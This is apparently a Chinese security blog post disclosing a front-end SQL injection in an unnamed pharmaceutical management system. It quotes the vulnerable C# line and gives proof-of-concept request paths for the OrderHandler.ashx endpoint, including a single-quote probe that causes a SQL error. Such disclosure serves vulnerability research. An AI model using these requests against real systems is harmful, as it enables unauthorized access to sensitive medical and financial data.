#  【1day】某医药系统存在前台SQL注入漏洞   
原创 XingYue404  星悦安全   2025-06-03 11:29  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x01 漏洞分析  
  
XX医药管理系统  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5d6VwFeEZ8uk2q7Aw1y09oicqC3rFa6FXnZg0BlhAh6CGkUnSxumwD1hrviaCNQ30v1RIFwicdvg5sQA/640?wx_fmt=png&from=appmsg "")  
  
工具一把梭哈找前台接口，分析代码  
  
/admin/caiwuchongxiao/OrderHandler.ashx  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5d6VwFeEZ8uk2q7Aw1y09oickEHsWTiaicZqQYY0O2UQxqA3rGFoPLibeGAx53qWhBJvtPZbEJSWB7VKw/640?wx_fmt=png&from=appmsg "")  
  
```
context.Response.Write(GetData("list", context.Request["ID"].ToString(),
context.Request["ordertype"].ToString()));

```  
  
  
接收 get 传参的 ID 和 ordertype 拼接到 sql 语句去执行  
  
POC  
  
```
/admin/caiwuchongxiao/OrderHandler.ashx?ID=1&ordertype=1

```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5d6VwFeEZ8uk2q7Aw1y09oicD274Ic0X2vPMic5xja6kuqDDyqZxbyepYo3J3arIRkk3qR9m6ycofEA/640?wx_fmt=png&from=appmsg "")  
  
单引号报错语法错误  
  
```
/admin/caiwuchongxiao/OrderHandler.ashx?ID=1%27&ordertype=1

```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5d6VwFeEZ8uk2q7Aw1y09oicdhkbiaajLgibPZTTgeiaURia2LjPxeibTM9OicC8u6ciaXm2Ee654v8zicvWZg/640?wx_fmt=png&from=appmsg "")  
## 0x02 关注公众号  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转**  
  
**关注公众号，持续更新安全文章!**  
  
****  
  
****  
**免责声明:文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
